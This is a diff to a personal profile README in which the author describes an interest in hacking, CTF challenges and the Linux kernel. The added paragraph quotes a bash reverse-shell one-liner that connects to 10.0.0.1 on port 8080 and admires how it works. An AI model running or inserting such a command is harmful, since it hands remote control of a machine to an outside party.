@@ -5,7 +5,7 @@ Probably my favourite thing about technology is the concept of hacking: "Playful
 
 In my free time I like to get increasingly deep understanding of different technologies and apply it to solving CTF challenges: You can find some of my solutions in this repo: https://github.com/marc-gav/picoCTF_solutions. I stopped adding my new solutions because honestly you can find better write-ups for picoCTF on youtube from people that know more than me.
 
-I am currenly learning about the Linux kernel, reverse engineering and network protocols. 
+I am currenly learning about the Linux kernel, reverse engineering and network protocols. After a couple years of using bash I discovered this snippet of code: `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`. I think it's beautiful to think of the different ideas that need to come together into one single bash command to form a reverse shell.
 
 ## Previously working on
 
